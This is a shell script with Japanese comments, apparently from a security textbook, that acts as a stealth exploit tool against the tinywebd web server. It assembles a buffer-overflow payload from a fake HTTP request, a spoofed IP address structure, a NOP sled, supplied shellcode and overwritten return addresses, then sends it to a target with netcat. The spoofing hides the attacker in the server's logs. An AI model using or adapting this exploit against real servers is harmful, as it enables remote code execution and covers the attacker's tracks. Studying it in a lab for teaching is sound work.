#!/bin/sh 
# tinywebd向け、ステルス型脆弱性攻撃ツール
#    メモリ中に格納されているIPアドレスも詐称する。

SPOOFIP="12.34.56.78"
SPOOFPORT="9090"

if [ -z "$2" ]; then  # 引数が足りない場合
   echo "使用方法： $0 ＜シェルコードを格納したファイル＞ ＜攻撃対象IPアドレス＞"
   exit
fi
FAKEREQUEST="GET / HTTP/1.1\x00"
FR_SIZE=$(perl -e "print \"$FAKEREQUEST\"" | wc -c | cut -f1 -d ' ')
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # バッファの開始位置（0xbffff5c0）+100バイト
FAKEADDR="\xcf\xf5\xff\xbf" # バッファの開始位置（0xbffff5c0）+15バイト
echo "攻撃対象IPアドレス： $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "シェルコード： $1 ($SIZE バイト)"
echo "ニセのリクエスト： \"$FAKEREQUEST\" ($FR_SIZE バイト)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))

echo "[ニセのリクエスト $FR_SIZE] [ニセのIPアドレス 16] [NOPスレッド $ALIGNED_SLED_SIZE] [シェルコード $SIZE] [戻りアドレス 128] [*fake_addr 8]"
(perl -e "print \"$FAKEREQUEST\"";
 ./addr_struct "$SPOOFIP" "$SPOOFPORT";
 perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
perl -e "print \"$RETADDR\"x32 . \"$FAKEADDR\"x2 . \"\x01\x00\x00\x00\r\n\"") | nc -w 1 -v $2 80
